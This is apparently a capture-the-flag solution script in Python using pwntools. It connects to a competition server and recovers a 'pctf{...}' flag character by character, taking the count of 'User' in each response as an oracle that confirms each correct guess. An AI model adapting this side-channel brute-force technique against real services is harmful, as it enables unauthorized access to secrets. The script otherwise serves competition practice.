import pwn

chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

def start():
    return pwn.remote("chal.pctf.competitivecyber.club", 4757)

def pad(s):
    return s + ("0" * (18 - len(s))) + "}"

def try_string(s):
    import time
    io = start()
    io.recv()
    io.send((s + "\n").encode())
    time.sleep(0.1)
    x = io.recv().decode()
    return x

base = "pctf{"
to_try = []

while len(base) < 18:
    for c in chars:
        # print(pad(base + c))
        out = try_string(pad(base + c))
        # print(out)
        if out.count("User") > len(base):
            print(out)
            base += c
            break
    print(base)